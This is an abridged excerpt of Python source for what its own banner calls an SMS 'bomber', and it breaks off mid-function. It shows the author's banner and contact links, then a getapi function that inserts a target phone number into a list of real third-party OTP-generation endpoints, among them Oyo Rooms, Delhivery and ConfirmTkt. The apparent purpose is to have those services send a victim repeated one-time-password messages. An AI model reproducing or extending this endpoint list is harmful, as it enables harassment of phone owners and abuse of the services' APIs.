...
def banner():
	...
	print('\n\n')
	os.system('echo -e "\e[4;34m This Bomber Was Created By SpeedX \e[0m"')
	os.system('echo -e "\e[1;34m For Any Queries Mail Me!!!\e[0m"')
	os.system('echo -e "\e[1;32m		   Mail: ggspeedx29@gmail.com \e[0m"')
	os.system('echo -e "\e[1;33m	   Telegram: https://t.me/TheSpeedX \e[0m"')
	os.system('echo -e "\e[4;32m   YouTube Page: https://www.youtube.com/c/GyanaTech \e[0m"')
...
def getapi(pn,lim,cc):
	...
	lim=int(lim)
	url=["https://www.oyorooms.com/api/pwa/generateotp?country_code=%2B"+str(cc)+"&nod=4&phone="+pn,"https://direct.delhivery.com/delhiverydirect/order/generate-otp?phoneNo="+pn,"https://securedapi.confirmtkt.com/api/platform/register?mobileNumber="+pn]
	try:
		if lim<len(url):
